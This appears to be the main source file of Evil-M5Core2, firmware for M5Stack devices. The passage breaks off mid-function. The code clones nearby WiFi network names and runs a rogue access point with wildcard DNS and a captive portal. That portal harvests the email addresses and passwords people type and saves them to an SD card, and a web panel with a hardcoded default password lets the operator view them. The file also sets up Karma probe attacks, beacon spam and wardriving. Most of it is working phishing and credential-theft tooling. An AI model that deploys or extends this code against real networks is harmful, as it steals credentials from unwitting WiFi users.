/*
    Evil-M5Core2 - WiFi Network Testing and Exploration Tool

    Copyright (c) 2024 7h30th3r0n3
    Copyright (c) 2024 lvlhead

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.

    Disclaimer:
    This tool, Evil-M5Core2, is developed for educational and ethical testing purposes only.
    Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-M5Core2
    assumes no liability and is not responsible for any misuse or damage caused by this tool.
    Users are required to comply with all applicable laws and regulations in their jurisdiction
    regarding network testing and ethical hacking.
*/

/*-----------------------------------------------------------------*/
/*------------------------- CONFIGURATION -------------------------*/
/*-----------------------------------------------------------------*/
// remember to change hardcoded webpassword below in the code to ensure no unauthorized access to web interface:
// Connect to nearby wifi network automaticaly to provide internet to the core2 you can be connected and provide AP at same time
// experimental
#define WEB_ACCESS_PASSWORD "password"  // password for web access to remote check captured credentials and send new html file
#define LED_ENABLED false  // change this to true to get cool led effect (only on fire)
#define GPS_ENABLED false  // Change this to true to enable GPS logging for Wardriving data
/*-----------------------------------------------------------------*/

#include <vector>
#include <string>
#include <set>

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include <M5StackMenuSystem.h>
#include <M5Unified.h>

extern "C" {
    #include "esp_wifi.h"
    #include "esp_system.h"
}

// Evil-M5 Headers
#include "evil-config.h"
#include "evil-led.h"
#include "evil-ui.h"
#include "evil-beacon.h"
#include "evil-detector.h"
#include "evil-monitor.h"
#include "evil-wardriving.h"
#include "evil-wof.h"
#include "evil-util.h"
#include "evil-wireless.h"

// Initialize modules
EvilConfig config;
EvilLED led;
EvilUI ui;
EvilBeacon beacon;
EvilDetector detector;
EvilMonitor monitor;
EvilWardrive wardrive;
EvilWireless wireless;
EvilWoF flipper;

// Set up Menu objects
Menu mainMenu("Main Menu");
Menu subMenuSettings("Settings");
Menu subMenuChangePortal("Change Portal");   // Lists all portal files in /sites and sets portal file in use

// Web and DNS Servers
WebServer server(80);
DNSServer dnsServer;

// bluetooth password pass
enum ConnectionState {
    AWAITING_PASSWORD,
    AUTHENTICATED
};
ConnectionState connectionState = AWAITING_PASSWORD;
// end bluetooth password pass

// Set up 
const char* accessWebPassword = WEB_ACCESS_PASSWORD;

String portalFiles[30]; // 30 portals max
int numPortalFiles = 0;
int portalFileIndex = 0;


int nbClientsConnected = 0;
int nbClientsWasConnected = 0;
int nbPasswords = 0;

File fsUploadFile; // global variable for file upload

String captivePortalPassword = "";

// Probe Sniffind part

#define MAX_SSIDS_Karma 200

char ssidsKarma[MAX_SSIDS_Karma][33];
int ssid_count_Karma = 0;
bool isScanningKarma = false;
int currentIndexKarma = -1;
int menuStartIndexKarma = 0;
int menuSizeKarma = 0;
const int maxMenuDisplayKarma = 9;

enum AppState {
    StartScanKarma,
    ScanningKarma,
    StopScanKarma,
    SelectSSIDKarma
};

AppState currentStateKarma = StartScanKarma;

bool isProbeSniffingMode = false;
bool isProbeKarmaAttackMode = false;
bool isKarmaMode = false;

// Probe Sniffing end

// AutoKarma part
std::set<std::string> seenWhitelistedSSIDs;

volatile bool newSSIDAvailable = false;
char lastSSID[33] = {0};
const int autoKarmaAPDuration = 15000; // Time for Auto Karma Scan can be ajusted if needed consider only add time(Under 10s to fast to let the device check and connect to te rogue AP)
bool isAutoKarmaActive = false;
bool isWaitingForProbeDisplayed = false;
unsigned long lastProbeDisplayUpdate = 0;
int probeDisplayState = 0;
static bool isInitialDisplayDone = false;
char lastDeployedSSID[33] = {0};
bool karmaSuccess = false;
//AutoKarma end

bool isItSerialCommand = false;

String ssidList[100];

int networkIndex;
int currentListIndex = 0;
int topVisibleIndex = 0;

const byte DNS_PORT = 53;
unsigned long previousMillis = 0;
const long interval = 1000;
static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_4;

// Global Variables
bool bluetoothEnabled;
bool isCaptivePortalOn;
String selectedPortalFile;
String currentClonedSSID;
int currentBrightness;


void setup() {
    // Initialize hardware
    M5.begin();
    Serial.begin(115200);
    randomSeed(esp_random());

    // Set up GPS Pins based on detected hardware
    int GPS_RX_PIN;
    int GPS_TX_PIN;
    switch (M5.getBoard()) {
        case m5::board_t::board_M5StackCore2:
            // Configuration for Core2
            GPS_RX_PIN = 13;
            GPS_TX_PIN = 14;
            Serial.println("M5Stack Core2 Board detected.");
            break;
        case m5::board_t::board_M5Stack: // Présumé ici comme étant le modèle Fire
            // Configuration for Fire
            GPS_RX_PIN = 16;
            GPS_TX_PIN = 17;
            Serial.println("M5Stack BASIC/GRAY GO/FIRE FACES II Board detected.");
            break;
        default:
            // Unsupported or unknown model, optionally set default values
            GPS_RX_PIN = -1; // -1 means not configured or not valid
            GPS_TX_PIN = -1;
            Serial.println("Error detecting board.");
        break;
    }

    // Configure display text/font settings
    ui.init();

    const char* startUpMessages[] = {
        "  There is no spoon...",
        "    Hack the Planet!",
        " Accessing Mainframe...",
        "    Cracking Codes...",
        "Decrypting Messages...",
        "Infiltrating the Network.",
        " Bypassing Firewalls...",
        "Exploring the Deep Web...",
        "Launching Cyber Attack...",
        " Running Stealth Mode...",
        "   Gathering Intel...",
        "     Shara Conord?",
        " Breaking Encryption...",
        "Anonymous Mode Activated.",
        " Cyber Breach Detected.",
        "Initiating Protocol 47...",
        " The Gibson is in Sight.",
        "  Running the Matrix...",
        "Neural Networks Syncing..",
        "Quantum Algorithm started",
        "Digital Footprint Erased.",
        "   Uploading Virus...",
        "Downloading Internet...",
        "  Root Access Granted.",
        "Cyberpunk Mode: Engaged.",
        "  Zero Days Exploited.",
        "Retro Hacking Activated.",
        " Firewall: Deactivated.",
        "Riding the Light Cycle...",
        "  Engaging Warp Drive...",
        "  Hacking the Holodeck..",
        "  Tracing the Nexus-6...",
        "Charging at 2,21 GigaWatt",
        "  Loading Batcomputer...",
        "  Accessing StarkNet...",
        "  Dialing on Stargate...",
        "   Activating Skynet...",
        " Unleashing the Kraken..",
        " Accessing Mainframe...",
        "   Booting HAL 9000...",
        " Death Star loading ...",
        " Initiating Tesseract...",
        "  Decrypting Voynich...",
        "   Hacking the Gibson...",
        "   Orbiting Planet X...",
        "  Accessing SHIELD DB...",
        " Crossing Event Horizon.",
        " Dive in the RabbitHole.",
        "   Rigging the Tardis...",
        " Sneaking into Mordor...",
        "Manipulating the Force...",
        "Decrypting the Enigma...",
        "Jacking into Cybertron..",
        "  Casting a Shadowrun...",
        "  Navigating the Grid...",
        " Surfing the Dark Web...",
        "  Engaging Hyperdrive...",
        " Overclocking the AI...",
        "   Bending Reality...",
        " Scanning the Horizon...",
        " Decrypting the Code...",
        "Solving the Labyrinth...",
        "  Escaping the Matrix...",
        " You know I-Am-Jakoby ?",
        "You know TalkingSasquach?",
        "Redirecting your bandwidth\nfor Leska free WiFi...", // Donation on Ko-fi // Thx Leska !
        "Where we're going We don't\nneed roads   Nefast - 1985",// Donation on Ko-fi // Thx Nefast !
        "Never leave a trace always\n behind you by CyberOzint",// Donation on Ko-fi // Thx CyberOzint !
        "   Injecting hook.worm \nransomware to your android",// Donation on Ko-fi // Thx hook.worm !
        "   Summoning the void             \nby kdv88", // Donation on Ko-fi // Thx kdv88 !
        "  Egg sandwich - robt2d2",// Donation on Ko-fi // Thx hook.worm ! Thx robt2d2 !
        "    You know Kiyomi ?   ", // for collab on Wof
        "           42           ",
        "    Don't be a Skidz !",
        "  Hack,Eat,Sleep,Repeat",
        "   You know Samxplogs ?",
        " For educational purpose",
        "Time to learn something",
        "U Like Karma? Check Mana",
        "   42 because Universe ",
        "Navigating the Cosmos...",
        "Unlocking Stellar Secrets",
        "Galactic Journeys Await..",
        "Exploring Unknown Worlds.",
        "   Charting Star Paths...",
        "   Accessing zone 51... ",
        "Downloading NASA server..",
        "   You know Pwnagotchi ?",
        "   You know FlipperZero?",
        "You know Hash-Monster ?",
        "Synergizing Neuromancer..",
        "Warping Through Cyberspac",
        "Manipulating Quantum Data",
        "Incepting Dreamscapes...",
        "Unlocking Time Capsules..",
        "Rewiring Neural Pathways.",
        "Unveiling Hidden Portals.",
        "Disrupting the Mainframe.",
        "Melding Minds w Machines.",
        "Bending the Digital Rules",
        "   Hack The Planet !!!",
        "Tapping into the Ether...",
        "Writing the Matrix Code..",
        "Sailing the Cyber Seas...",
        "  Reviving Lost Codes...",
        "   HACK THE PLANET !!!",
        " Dissecting DNA of Data",
        "Decrypting the Multiverse",
        "Inverting Reality Matrice",
        "Conjuring Cyber Spells...",
        "Hijacking Time Streams...",
        "Unleashing Digital Demons",
        "Exploring Virtual Vortexe",
        "Summoning Silicon Spirits",
        "Disarming Digital Dragons",
        "Casting Code Conjurations",
        "Unlocking the Ether-Net..",
        " Show me what you got !!!",
        " Do you have good Karma ?",
        "Waves under surveillance!",
        "    Shaking champagne…",
        "Warping with Rick & Morty",
        "       Pickle Rick !!!",
        "Navigating the Multiverse",
        "   Szechuan Sauce Quest.",
        "   Morty's Mind Blowers.",
        "   Ricksy Business Afoot.",
        "   Portal Gun Escapades.",
        "     Meeseeks Mayhem.",
        "   Schwifty Shenanigans.",
        "  Dimension C-137 Chaos.",
        "Cartman's Schemes Unfold.",
        "Stan and Kyle's Adventure",
        "   Mysterion Rises Again.",
        "   Towelie's High Times.",
        "Butters Awkward Escapades",
        "Navigating the Multiverse",
        "    Affirmative Dave,\n        I read you.",
        "  Your Evil-M5Core2 have\n     died of dysentery",
    };

    // Select random message to display
    const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);
    int randomIndex = random(numMessages);
    const char* randomMessage = startUpMessages[randomIndex];

    // Attempt to bring up the SD card
    if (!SD.begin(SDCARD_CSPIN, SPI, 25000000)) {
        sendMessage("Error, SD card not mounted...");
    } else {
        sendMessage("----------------------");
        sendMessage("SD card initialized !! ");
        sendMessage("----------------------");
        config.restoreConfigParameter("brightness");
        ui.drawImage("/img/startup.jpg");
#if LED_ENABLED
        led.pattern1();
#endif
        delay(2000);
    }

    // Check battery level, display warning if low
    String batteryLevelStr = monitor.getBatteryLevel();
    int batteryLevel = batteryLevelStr.toInt();

    if (batteryLevel < 15) {
        ui.drawImage("/img/low-battery.jpg");
        sendMessage("-------------------");
        sendMessage("!!!!Low Battery!!!!");
        sendMessage("-------------------");
        delay(4000);
    }

    // Display about screen
    ui.aboutScreen(randomMessage);
    sendMessage("-------------------");
    sendMessage(" Evil-M5Core2");
    sendMessage("By 7h30th3r0n3");
    sendMessage(APP_VERSION);
    sendMessage("-------------------");
    sendMessage(" ");
    sendMessage(randomMessage);
    sendMessage("-------------------");

    // Scan for local Wifi networks
    wireless.saveOriginalMAC();
    wireless.scanWiFi();
#if LED_ENABLED
    led.pattern2();
#endif

    // Connect to WiFi network
    wireless.connectToWiFi();

    // Complete hardware initialization
    led.init();
#if GPS_ENABLED
    Serial2.begin(9600, SERIAL_8N1, GPS_RX_PIN, GPS_TX_PIN);  //  GPS, change RX_PIN and TX_PIN if needed
#endif

    // Define Main Menu
    mainMenu.addMenuItem("Scan/Details/Clone", emptyWifiDetailCallback, showWifiDetailSelect);
    mainMenu.addMenuItem("Start Captive Portal", createCaptivePortal);
    mainMenu.addMenuItem("Stop Captive Portal", stopCaptivePortal);
    mainMenu.addMenuItem("Wardriving", wardrive.emptyWardriveCallback, showWardriveMode);
    mainMenu.addMenuItem("Beacon Spam", beacon.emptyBeaconCallback, showBeaconAttack);
    mainMenu.addMenuItem("Handshake/Deauth Sniffing", detector.emptyDetectorCallback, showDetector);
    mainMenu.addMenuItem("Wall of Flipper", flipper.emptyWoFCallback, showWoFScanner);
    mainMenu.addSubMenu("Settings", &subMenuSettings);

    // Define Settings Menu
    subMenuSettings.addMenuItem("Monitor Status", monitor.emptyMonitorCallback, showMonitorStatus);
    subMenuSettings.addMenuItem("Adjust Brightness", emptyBrigtnessCallback, showBrightnessAdjust);
    subMenuSettings.addSubMenu("Change Portal", &subMenuChangePortal);
    subMenuSettings.addMenuItem("Check Credentials", checkCredentials);
    subMenuSettings.addMenuItem("Delete All Credentials", deleteCredentials);
    subMenuSettings.addMenuItem("Delete All Probes", deleteAllProbes);

    // Customize the menu layouts, currently to set menu width/height
    customizeLayout(mainMenu.getLayout());
    customizeLayout(subMenuSettings.getLayout());
    customizeLayout(subMenuChangePortal.getLayout());

    // TODO: Remove random initialization of global variables
    currentClonedSSID = "Evil-M5Core2";
    isCaptivePortalOn = false;
    bluetoothEnabled = false;
    currentBrightness = M5.Display.getBrightness();
    selectedPortalFile = "/sites/normal.html"; // defaut portal
    listPortalFiles();
}


void customizeLayout(Layout& layout) {
    // smaller font
    //layout.MENU_FONT = 11;
    //layout.MENU_FONT_SIZE = 2;

    // monochrome theme
    //layout.TOP_BAR_TITLE_COLOR = WHITE;
    layout.TOP_BAR_BACKGROUND_COLOR = PURPLE;

    //layout.MENU_ITEM_TEXT_COLOR = WHITE;
    //layout.MENU_ITEM_BACKGROUND_COLOR = BLACK;
    //layout.MENU_ITEM_HIGHLIGHTED_TEXT_COLOR = BLACK;
    //layout.MENU_ITEM_HIGHLIGHTED_BACKGROUND_COLOR = WHITE;
    //layout.MENU_ITEM_HIGHLIGHTED_ICON_SIZE = 3;

    layout.BOTTOM_BAR_BACKGROUND_COLOR = PURPLE;
    //layout.BOTTOM_BAR_SOFTKEY_COLOR = WHITE;
    layout.BOTTOM_BAR_SOFTKEY_BACKGROUND_COLOR = PURPLE;
}


void loop() {
    M5.update();
    handleDnsRequestSerial();

    // Menu loop
    if (mainMenu.isEnabled()) {
        mainMenu.loop();
    } else {
        M5.Lcd.clear(BLACK);

        if (M5.BtnA.wasReleased() || M5.BtnB.wasReleased() || M5.BtnC.wasReleased()) {
            mainMenu.enable();
        }
    }
}

// Monitor Status
void showMonitorStatus(CallbackMenuItem& menuItem) {
    monitor.showMonitorPage();

    if (M5.BtnA.wasReleased()) {
        monitor.nextPage();
    } else if (M5.BtnB.wasReleased()) {
        monitor.prevPage();
    } else if (M5.BtnC.wasReleased()) {
        monitor.resetMonitorPage();
        menuItem.deactivateCallbacks();
    }
}

// Beacon Attack
void showBeaconAttack(CallbackMenuItem& menuItem) {
    beacon.showBeaconApp();

    if (M5.BtnB.wasReleased()) {
        // Close app and return to main menu
        beacon.closeBeaconApp();
        menuItem.deactivateCallbacks();
    }
}

// Handshake / Deauth Detector
void showDetector(CallbackMenuItem& menuItem) {
    detector.showDetectorApp();

    if (M5.BtnA.wasReleased()) {
        detector.toggleAutoChannelHop();
        sendMessage(detector.getAutoChannelHop() ? "Auto Mode" : "Static Mode");
    } else if (M5.BtnB.wasReleased()) {
        // Close app and return to main menu
        detector.closeApp();
        menuItem.deactivateCallbacks();
    } else if (M5.BtnC.wasReleased()) {
        if (!detector.getAutoChannelHop()) {
            detector.incrementChannel(1);
        }
    }
}

// Wall of Flipper Scanner
void showWoFScanner(CallbackMenuItem& menuItem) {
    flipper.showWoFApp();

    if (M5.BtnB.wasReleased()) {
        // Close app and return to main menu
        flipper.closeWoFApp();
        menuItem.deactivateCallbacks();
    }
}

// Wardriving Mode
void showWardriveMode(CallbackMenuItem& menuItem) {
    wardrive.showWardriveApp();

    if (M5.BtnB.wasReleased()) {
        // Close app and return to main menu
        wardrive.closeWardriveApp();
        menuItem.deactivateCallbacks();
    }
}

// Brightness Adjustment
void emptyBrigtnessCallback(CallbackMenuItem& menuItem) {
    M5.Display.clear();
    menuItem.getMenu()->displaySoftKey(BtnASlot, "Decr");
    menuItem.getMenu()->displaySoftKey(BtnBSlot, "Incr");
    menuItem.getMenu()->displaySoftKey(BtnCSlot, "Save");
}

void showBrightnessAdjust(CallbackMenuItem& menuItem) {
    int minBrightness = 1;
    int maxBrightness = 255;
    float brightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
    bool brightnessAdjusted = false;

    if (M5.BtnA.wasReleased()) {
        // Decrease brightness
        currentBrightness = max(minBrightness, currentBrightness - 12);
        brightnessAdjusted = true;
    } else if (M5.BtnB.wasReleased()) {
        // Increase brightness
        currentBrightness = min(maxBrightness, currentBrightness + 12);
        brightnessAdjusted = true;
    } else if (M5.BtnC.wasReleased()) {
        // Save and exit
        if (config.saveConfigParameter("brightness", currentBrightness)) {
            sendMessage("brightness saved!");
        } else {
            sendMessage("Error when opening config.txt for writing");
        }

        ui.waitAndReturnToMenu("Brightness set to " + String((int)brightnessPercentage) + "%");
        menuItem.deactivateCallbacks();
    }

    ui.writeSingleMessage("Brightness: " + String((int)brightnessPercentage) + "%", false);
    if (brightnessAdjusted) {
        ui.clearAppScreen();
        M5.Display.setBrightness(currentBrightness);
    }
}

// Clone & Details
void emptyWifiDetailCallback(CallbackMenuItem& menuItem) {
    M5.Display.clear();
    networkIndex = 0;

    // Scan WiFi and write messages to user before buttons render
    ui.writeSingleMessage("Scan in progress...", false);
    wireless.scanWiFi();
    ui.clearAppScreen();
    ui.writeSingleMessage("Scan Completed", false);
    delay(500);
    ui.clearAppScreen();

    // Render the SoftKeys
    menuItem.getMenu()->displaySoftKey(BtnASlot, "Prev");
    menuItem.getMenu()->displaySoftKey(BtnBSlot, "Next");
    menuItem.getMenu()->displaySoftKey(BtnCSlot, "Clone");
}

void showWifiDetailSelect(CallbackMenuItem& menuItem) {
    int channel = WiFi.channel(networkIndex);
    String security = wireless.getWifiSecurity(networkIndex);
    int32_t rssi = WiFi.RSSI(networkIndex);
    uint8_t* bssid = WiFi.BSSID(networkIndex);
    String macAddress = bssidToString(bssid);
    bool updateScreen = false;

    if (M5.BtnA.wasReleased()) {
        // Select Previous SSID
        networkIndex = (networkIndex - 1 + wireless.getNumSSID()) % wireless.getNumSSID();
        updateScreen = true;
    } else if (M5.BtnB.wasReleased()) {
        // Select Next SSID
        networkIndex = (networkIndex + 1) % wireless.getNumSSID();
        updateScreen = true;
    } else if (M5.BtnC.wasReleased()) {
        // Clone and Exit
        currentClonedSSID = ssidList[networkIndex];
        //ui.setInMenu(true);
        ui.waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
        sendMessage(ssidList[networkIndex] + " Cloned...");
        menuItem.deactivateCallbacks();
    }

    std::vector<String> messages;
    messages.push_back("SSID: " + (ssidList[networkIndex].length() > 0 ? ssidList[networkIndex] : "N/A"));
    messages.push_back("Channel: " + (channel > 0 ? String(channel) : "N/A"));
    messages.push_back("Security: " + (security.length() > 0 ? security : "N/A"));
    messages.push_back("Signal: " + (rssi != 0 ? String(rssi) + " dBm" : "N/A"));
    messages.push_back("MAC: " + (macAddress.length() > 0 ? macAddress : "N/A"));
    ui.writeVectorMessage(messages, 10, 20, 25);

    if (updateScreen) {
        ui.clearAppScreen();
        sendMessage("------Wifi-Info----");
        sendMessage("SSID: " + ssidList[networkIndex]);
        sendMessage("Channel: " + String(WiFi.channel(networkIndex)));
        sendMessage("Security: " + security);
        sendMessage("Signal: " + String(rssi) + " dBm");
        sendMessage("MAC: " + macAddress);
        sendMessage("-------------------");
    }
}


void deleteCredentials(CallbackMenuItem& menuItem) {
    if (ui.confirmPopup("Delete credentials?", true)) {
        File file = openFile("/credentials.txt", FILE_WRITE);

        if (file) {
            file.close();
            sendMessage("-------------------");
            sendMessage("credentials.txt deleted");
            sendMessage("-------------------");
            ui.waitAndReturnToMenu("Deleted successfully");
            sendMessage("Credentials deleted successfully");
        } else {
            sendMessage("-------------------");
            sendMessage("Error deleteting credentials.txt ");
            sendMessage("-------------------");
            ui.waitAndReturnToMenu("Error..");
            sendMessage("Error opening file for deletion");
        }
    } else {
        ui.waitAndReturnToMenu("Deletion cancelled");
    }
}

void listPortalFiles() {
    // Read files from directory and populate menu
    File root = openFile("/sites", FILE_READ);

    while (File file = root.openNextFile()) {
        if (!file.isDirectory()) {
            String fileName = file.name();
            // Ignore mac os file stating with ._
            if (!fileName.startsWith("._") && fileName.endsWith(".html")) {
                portalFiles[numPortalFiles] = String("/sites/") + fileName;
                numPortalFiles++;
            }
        }
        file.close();
    }
    root.close();

    for (int i = 0; i < numPortalFiles; i++) {
        subMenuChangePortal.addMenuItem(portalFiles[i], [](CallbackMenuItem& menuItem) {
            portalFileIndex = menuItem.getPosition() - 1;
            selectedPortalFile = portalFiles[portalFileIndex];
            sendMessage("-------------------");
            sendMessage(String(selectedPortalFile) + " portal selected.");
            sendMessage("-------------------");
#if LED_ENABLED
            led.pattern5();
#endif
            ui.waitAndReturnToMenu(String(selectedPortalFile) + " selected");
            changePortal(portalFileIndex);
            menuItem.getMenu()->disable();  // Exit to the previous menu
        });
    }
}

// *** OLD CODE ***

void handleDnsRequestSerial() {
    if (isCaptivePortalOn) {
        dnsServer.processNextRequest();
        server.handleClient();
    }
}


void listProbesSerial() {
    File file = openFile("/probes.txt", FILE_READ);

    int probeIndex = 0;
    sendMessage("List of Probes:");
    while (file.available()) {
        String probe = file.readStringUntil('\n');
        probe.trim();
        if (probe.length() > 0) {
            sendMessage(String(probeIndex) + ": " + probe);
            probeIndex++;
        }
    }
    file.close();
}

void selectProbeSerial(int index) {
    File file = openFile("/probes.txt", FILE_READ);

    int currentIndex = 0;
    String selectedProbe = "";
    while (file.available()) {
        String probe = file.readStringUntil('\n');
        if (currentIndex == index) {
            selectedProbe = probe;
            break;
        }
        currentIndex++;
    }
    file.close();

    if (selectedProbe.length() > 0) {
        currentClonedSSID = selectedProbe;
        sendMessage("Probe selected: " + selectedProbe);
    } else {
        sendMessage("Probe index not found.");
    }
}

String currentlySelectedSSID = "";
bool isProbeAttackRunning = false;
bool stopProbeSniffingViaSerial = false;
bool isProbeSniffingRunning = false;

void selectNetwork(int index) {
    if (index >= 0 && index < wireless.getNumSSID()) {
        currentlySelectedSSID = ssidList[index];
        sendMessage("SSID selection: " + currentlySelectedSSID);
    } else {
        sendMessage("SSID index invalid.");
    }
}


void checkCredentialsSerial() {
    File file = openFile("/credentials.txt", FILE_READ);

    bool isEmpty = true;
    sendMessage("----------------------");
    sendMessage("Credentials Found:");
    sendMessage("----------------------");
    while (file.available()) {
        String line = file.readStringUntil('\n');
        if (line.length() > 0) {
            sendMessage(line);
            isEmpty = false;
        }
    }
    file.close();
    if (isEmpty) {
        sendMessage("No credentials found.");
    }
}

void changePortal(int index) {
    File root = openFile("/sites", FILE_READ);

    int currentIndex = 0;
    String selectedFile;
    while (File file = root.openNextFile()) {
        if (currentIndex == index) {
            selectedFile = String(file.name());
            break;
        }
        currentIndex++;
        file.close();
    }
    root.close();
    if (selectedFile.length() > 0) {
        sendMessage("Changing portal to: " + selectedFile);
        selectedPortalFile = "/sites/" + selectedFile;
    } else {
        sendMessage("Invalid portal index");
    }
}


String bssidToString(uint8_t* bssid) {
    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    return String(mac);
}

void createCaptivePortal(CallbackMenuItem& menuItem) {
    String ssid = currentClonedSSID.isEmpty() ? "Evil-M5Core2" : currentClonedSSID;
    WiFi.mode(WIFI_MODE_APSTA);
    if (!isAutoKarmaActive){
        if (captivePortalPassword == ""){
            WiFi.softAP(currentClonedSSID.c_str());
        }else{
            WiFi.softAP(currentClonedSSID.c_str(), captivePortalPassword.c_str());
        }
    }

    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    isCaptivePortalOn = true;

    server.on("/", HTTP_GET, []() {
        String email = server.arg("email");
        String password = server.arg("password");
        if (!email.isEmpty() && !password.isEmpty()) {
            saveCredentials(email, password, selectedPortalFile.substring(7), currentClonedSSID); // Assurez-vous d'utiliser les bons noms de variables
            server.send(200, "text/plain", "Credentials Saved");
        } else {
            sendMessage("-------------------");
            sendMessage("Direct Web Access !!!");
            sendMessage("-------------------");
            servePortalFile(selectedPortalFile);
        }
    });


    server.on("/evil-m5core2-menu", HTTP_GET, []() {
        String html = "<!DOCTYPE html><html><head><style>";
        html += "body{font-family:sans-serif;background:#f0f0f0;padding:40px;display:flex;justify-content:center;align-items:center;height:100vh}";
        html += "form{text-align:center;}div.menu{background:white;padding:20px;box-shadow:0 4px 8px rgba(0,0,0,0.1);border-radius:10px}";
        html += " input,a{margin:10px;padding:8px;width:80%;box-sizing:border-box;border:1px solid #ddd;border-radius:5px}";
        html += " a{display:inline-block;text-decoration:none;color:white;background:#007bff;text-align:center}";
        html += "</style></head><body>";
        html += "<div class='menu'><form action='/evil-m5core2-menu' method='get'>";
        html += "Password: <input type='password' name='pass'><br>";
        html += "<a href='javascript:void(0);' onclick='this.href=\"/credentials?pass=\"+document.getElementsByName(\"pass\")[0].value'>Credentials</a>";
        html += "<a href='javascript:void(0);' onclick='this.href=\"/uploadhtmlfile?pass=\"+document.getElementsByName(\"pass\")[0].value'>Upload File On SD</a>";
        html += "<a href='javascript:void(0);' onclick='this.href=\"/check-sd-file?pass=\"+document.getElementsByName(\"pass\")[0].value'>Check SD File</a>";
        html += "<a href='javascript:void(0);' onclick='this.href=\"/Change-Portal-Password?pass=\"+document.getElementsByName(\"pass\")[0].value'>Change WPA Password</a>";
        html += "</form></div></body></html>";
        server.send(200, "text/html", html);
        sendMessage("-------------------");
        sendMessage("evil-m5core2-menu access.");
        sendMessage("-------------------");
    });

    server.on("/credentials", HTTP_GET, []() {
        String password = server.arg("pass");
        if (password == accessWebPassword) {
            File file = openFile("/credentials.txt", FILE_READ);

            if (file) {
                if (file.size() == 0) {
                    server.send(200, "text/html", "<html><body><p>No credentials...</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
                } else {
                    server.streamFile(file, "text/plain");
                }
                file.close();
            } else {
                server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
            }
        } else {
            server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
        }
    });


    server.on("/check-sd-file", HTTP_GET, handleSdCardBrowse);
    server.on("/download-sd-file", HTTP_GET, handleFileDownload);
    server.on("/list-directories", HTTP_GET, handleListDirectories);

    server.on("/uploadhtmlfile", HTTP_GET, []() {
        if (server.arg("pass") == accessWebPassword) {
            String password = server.arg("pass");
            String html = "<!DOCTYPE html><html><head>";
            html += "<meta charset='UTF-8'>";
            html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
            html += "<title>Upload File</title></head>";
            html += "<body><div class='container'>";
            html += "<form id='uploadForm' method='post' enctype='multipart/form-data'>";
            html += "<input type='file' name='file' accept='*/*'>";
            html += "Select directory: <select id='dirSelect' name='directory'>";
            html += "<option value='/'>/</option>";
            html += "</select><br>";
            html += "<input type='submit' value='Upload file'>";
            html += "</form>";
            html += "<script>";
            html += "window.onload = function() {";
            html += "    var passValue = '" + password + "';";
            html += "    var dirSelect = document.getElementById('dirSelect');";
            html += "    fetch('/list-directories?pass=' + encodeURIComponent(passValue))";
            html += "        .then(response => response.text())";
            html += "        .then(data => {";
            html += "            const dirs = data.split('\\n');";
            html += "            dirs.forEach(dir => {";
            html += "                if (dir.trim() !== '') {";
            html += "                    var option = document.createElement('option');";
            html += "                    option.value = dir;";
            html += "                    option.textContent = dir;";
            html += "                    dirSelect.appendChild(option);";
            html += "                }";
            html += "            });";
            html += "        })";
            html += "        .catch(error => console.error('Error:', error));";
            html += "    var form = document.getElementById('uploadForm');";
            html += "    form.onsubmit = function(event) {";
            html += "        event.preventDefault();";
            html += "        var directory = dirSelect.value;";
            html += "        form.action = '/upload?pass=' + encodeURIComponent(passValue) + '&directory=' + encodeURIComponent(directory);";
            html += "        form.submit();";
            html += "    };";
            html += "};";
            html += "</script>";
            html += "<style>";
            html += "body,html{height:100%;margin:0;display:flex;justify-content:center;align-items:center;background-color:#f5f5f5}select {padding: 10px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ddd; width: 92%; background-color: #fff; color: #333;}.container{width:50%;max-width:400px;min-width:300px;padding:20px;background:#fff;box-shadow:0 4px 8px rgba(0,0,0,.1);border-radius:10px;display:flex;flex-direction:column;align-items:center}form{width:100%}input[type=file],input[type=submit]{width:92%;padding:10px;margin-bottom:10px;border-radius:5px;border:1px solid #ddd}input[type=submit]{background-color:#007bff;color:#fff;cursor:pointer;width:100%}input[type=submit]:hover{background-color:#0056b3}@media (max-width:600px){.container{width:80%;min-width:0}}";
            html += "</style></body></html>";

            server.send(200, "text/html", html);
        } else {
            server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
        }
    });



    server.on("/upload", HTTP_POST, []() {
        server.send(200);
    }, handleFileUpload);

    server.on("/delete-sd-file", HTTP_GET, handleFileDelete);

    server.on("/Change-Portal-Password", HTTP_GET, handleChangePassword);


    server.onNotFound([]() {
        sendMessage("-------------------");
        sendMessage("Portal Web Access !!!");
        sendMessage("-------------------");

        servePortalFile(selectedPortalFile);
    });

    server.begin();
    sendMessage("-------------------");
